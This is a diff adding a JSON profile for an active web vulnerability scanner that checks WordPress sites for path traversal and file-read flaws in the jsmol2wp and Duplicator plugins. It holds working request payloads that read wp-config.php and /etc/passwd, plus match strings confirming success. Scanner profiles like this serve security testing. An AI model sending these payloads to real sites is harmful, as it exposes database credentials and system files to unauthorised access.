@@ -1,0 +1,56 @@
+[
+  {
+    "profile_name": "Wordpress_SSRF_and_Path_Traversal",
+    "enabled": true,
+    "scanner": "active",
+    "author": "@bountysecurity",
+    "steps": [
+      {
+        "request_type": "original",
+        "reuse_cookie": false,
+        "insertion_point": "same",
+        "raw_request": "",
+        "payloads": [
+          "true,/wp-content/plugins/jsmol2wp/php/jsmol.php?isform\u003dtrue\u0026call\u003dgetRawDataFromDatabase\u0026query\u003dphp://filter/resource\u003d../../../../wp-config.php",
+          "true,/gsp4pdb2/jsmol/php/jsmol.php?isform\u003dtrue\u0026call\u003dgetRawDataFromDatabase\u0026query\u003dphp://filter/resource\u003d../../../../../../../../etc/passwd",
+          "true,/wp-admin/admin-ajax.php?action\u003dduplicator_download\u0026file\u003d/../wp-config.php"
+        ],
+        "payloads_file": "",
+        "payload_position": "replace",
+        "change_http_request": false,
+        "change_http_request_type": "post_to_get",
+        "insertion_points": [
+          "single_path_discovery",
+          "user_provided"
+        ],
+        "header_value": false,
+        "new_headers": [],
+        "match_replace": [],
+        "encoder": [],
+        "url_encode": false,
+        "chars_to_url_encode": "",
+        "greps_file": "",
+        "grep": [
+          "true,,Simple String,,wp-config",
+          "true,OR,Simple String,,passwd",
+          "true,OR,Simple String,,root:x",
+          "true,OR,Simple String,,DB_NAME"
+        ],
+        "redir_type": "always",
+        "max_redir": 5,
+        "show_alert": "always",
+        "issue_name": "Wordpress_SSRF_and_Path_Traversal",
+        "issue_severity": "High",
+        "issue_confidence": "Certain",
+        "issue_detail": "",
+        "remediation_detail": "",
+        "issue_background": "",
+        "remediation_background": ""
+      }
+    ],
+    "Tags": [
+      "WordPress",
+      "All"
+    ]
+  }
+]
